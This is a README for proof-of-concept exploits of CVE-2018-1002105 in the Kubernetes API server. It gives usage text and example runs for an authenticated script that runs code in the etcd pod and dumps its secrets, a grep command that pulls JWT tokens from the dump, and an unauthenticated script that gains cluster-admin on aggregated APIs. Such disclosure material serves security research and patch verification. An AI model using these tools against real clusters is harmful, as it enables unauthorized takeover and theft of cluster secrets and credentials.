# CVE-2018-1002105 PoC

* [Authenticated PoC](#authenticated-poc)
    * [Demo](#demo)
    * [Usage](#usage)
* [Unauthenticated PoC](#unauthenticated-poc)
    * [Demo](#demo-1)
    * [Usage](#usage-1)


## Authenticated PoC
Proof-of-Concept exploit for CVE-2018-1002105. The current exploit requires `create` and `get` privileges on `pods` and `pods/exec`. Support has been added for `portforward` and `attach`, which require similar permissions. 

The current PoC dumps the secrets from the default `etcd-kubernetes` pod.

### Demo
The PoC in action:

[![asciicast](https://asciinema.org/a/kubSrehAf14K7MQ9aZw2RpCYd.svg)](https://asciinema.org/a/kubSrehAf14K7MQ9aZw2RpCYd)

### Usage

```bash
usage: poc.py [-h] --target TARGET --jwt TOKEN [--namespace NAMESPACE] --pod
              POD --method {exec,portforward,attach}
              [--privileged-namespace PNAMESPACE] [--privileged-pod PPOD]
              [--container CONTAINER] [--command COMMAND]
              [--filename FILENAME]

PoC for CVE-2018-1002105.

optional arguments:
  -h, --help            show this help message and exit

required arguments:
  --target TARGET, -t TARGET
                        API server target:port
  --jwt TOKEN, -j TOKEN
                        JWT token for service account
  --namespace NAMESPACE, -n NAMESPACE
                        Namespace with method access
  --pod POD, -p POD     Pod with method access
  --method {exec,portforward,attach}, -m {exec,portforward,attach}

optional arguments:
  --privileged-namespace PNAMESPACE, -s PNAMESPACE
                        Target namespace
  --privileged-pod PPOD, -e PPOD
                        Target privileged pod
  --container CONTAINER, -c CONTAINER
                        Target container
  --command COMMAND, -x COMMAND
                        Command to execute
  --filename FILENAME, -f FILENAME
                        File to save output to

```

Example:

```bash
$ ./poc.py -t 10.0.2.15:6443 --jwt [token] -p [pod] -f etcd.out -m attach
[*] Building pipe using attach...
[+] Pipe opened :D
[*] Attempting code exec on etcd-kubernetes/etcd
[*] Writing output to etcd.out ....
[+] Done!
```

Check for tokens:

```bash
$ grep -air eyJ etcd.db
```

## Unauthenticated PoC
The unauthenticated PoC allows privilege escalation within the context of the exposed API. Depending on the functionalities of the API it might be possible to get code execution on pods. This demo currently exploits the bug to gain cluster-admin rights on the `servicecatalog.k8s.io` API. This exploit should also work for `metrics.k8s.io` or any API exposed through the aggregated layer.

### Demo
The PoC in action:

[![asciicast](https://asciinema.org/a/TjbO5p1JJN0dnNSSWhrcopn9e.svg)](https://asciinema.org/a/TjbO5p1JJN0dnNSSWhrcopn9e)

### Usage

```bash
usage: unauth_poc.py [-h] --target TARGET [--api-base BASE]
                     [--api-target TARGET_API] [--api-version VERSION]
                     [--json] [--filename FILENAME]

Unauthenticated PoC for CVE-2018-1002105

optional arguments:
  -h, --help            show this help message and exit

required arguments:
  --target TARGET, -t TARGET
                        API server target:port
  --api-base BASE, -b BASE
                        Target API name i.e. "servicecatalog.k8s.io"
  --api-target TARGET_API, -u TARGET_API
                        API to access i.e. "clusterservicebrokers"

optional arguments:
  --api-version VERSION, -a VERSION
                        API version to use i.e. "v1beta1"
  --json, -j            Print json output
  --filename FILENAME, -f FILENAME
                        File to save output to
```

Example:

```bash
$ ./unauth_poc.py -t 10.0.2.15:6443 --json -f api.out
[*] Building pipe ...
[+] Pipe opened :D
[*] Attempting to access url
[+] Pipe opened :D
[*] Writing output to api.out ....
[+] Done!

```
